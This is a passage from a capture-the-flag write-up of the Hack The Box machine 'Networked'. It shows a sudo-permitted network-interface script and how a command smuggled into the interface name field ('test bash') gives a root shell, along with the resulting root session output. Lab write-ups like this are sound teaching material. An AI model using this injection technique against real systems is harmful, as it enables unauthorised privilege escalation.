<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked ~]$ sudo -l</span><br><span class="line">Matching Defaults entries for guly on networked:</span><br><span class="line">    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,</span><br><span class="line">    env_reset, env_keep&#x3D;&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,</span><br><span class="line">    secure_path&#x3D;&#x2F;sbin\:&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line">User guly may run the following commands on networked:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;changename.sh</span><br><span class="line">[guly@networked ~]$</span><br></pre></td></tr></table></figure>
<p><code>changename.sh</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked ~]$ cat /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line">cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF</span><br><span class="line">DEVICE=guly0</span><br><span class="line">ONBOOT=no</span><br><span class="line">NM_CONTROLLED=no</span><br><span class="line">EoF</span><br><span class="line"></span><br><span class="line">regexp=<span class="string">"^[a-zA-Z0-9_\ /-]+$"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"interface <span class="variable">$var</span>:"</span></span><br><span class="line">        <span class="built_in">read</span> x</span><br><span class="line">        <span class="keyword">while</span> [[ ! <span class="variable">$x</span> =~ <span class="variable">$regexp</span> ]]; <span class="keyword">do</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"wrong input, try again"</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"interface <span class="variable">$var</span>:"</span></span><br><span class="line">                <span class="built_in">read</span> x</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$var</span>=<span class="variable">$x</span> &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">/sbin/ifup guly0</span><br><span class="line">[guly@networked ~]$</span><br></pre></td></tr></table></figure>
<p>This script simply creates a network script for an interface called <code>guly</code> then activates that interface. It asks the user for these options: <code>NAME</code>, <code>PROXY_METHOD</code>, <code>BROWSER_ONLY</code>, <code>BOOTPROTO</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked ~]$ sudo &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">test</span><br><span class="line">interface PROXY_METHOD:</span><br><span class="line">test</span><br><span class="line">interface BROWSER_ONLY:</span><br><span class="line">test</span><br><span class="line">interface BOOTPROTO:</span><br><span class="line">test</span><br><span class="line">ERROR     : [&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifup-eth] Device guly0 does not seem to be present, delaying initialization.</span><br></pre></td></tr></table></figure>
<p>We’re only interested in the <code>NAME</code> option because according to <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f" target="_blank" rel="noopener">this page</a> we can inject commands in the interface name.  Let’s try to execute <code>bash</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked ~]$ sudo &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">test bash</span><br><span class="line">interface PROXY_METHOD:</span><br><span class="line">test</span><br><span class="line">interface BROWSER_ONLY:</span><br><span class="line">test</span><br><span class="line">interface BOOTPROTO:</span><br><span class="line">test</span><br><span class="line">[root@networked network-scripts]# whoami</span><br><span class="line">root</span><br><span class="line">[root@networked network-scripts]# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">[root@networked network-scripts]# cd &#x2F;root&#x2F;</span><br><span class="line">[root@networked ~]# ls -la</span><br><span class="line">total 28</span><br><span class="line">dr-xr-x---.  2 root root  144 Jul 15 11:34 .</span><br><span class="line">dr-xr-xr-x. 17 root root  224 Jul  2 13:27 ..</span><br><span class="line">lrwxrwxrwx.  1 root root    9 Jul  2 13:35 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--.  1 root root   18 Dec 29  2013 .bash_logout</span><br><span class="line">-rw-r--r--.  1 root root  176 Dec 29  2013 .bash_profile</span><br><span class="line">-rw-r--r--.  1 root root  176 Dec 29  2013 .bashrc</span><br><span class="line">-rw-r--r--.  1 root root  100 Dec 29  2013 .cshrc</span><br><span class="line">-r--------.  1 root root   33 Oct 30  2018 root.txt</span><br><span class="line">-rw-r--r--.  1 root root  129 Dec 29  2013 .tcshrc</span><br><span class="line">-rw-------   1 root root 1011 Jul 15 11:34 .viminfo</span><br><span class="line">[root@networked network-scripts]#</span><br></pre></td></tr></table></figure>
<p>And we got a root shell.<br><img src="/images/hackthebox/networked/14.png" alt=""><br>We owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a><br>Next Hack The Box write-up : <a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-11-16</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/sudo/" rel="tag">#sudo</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
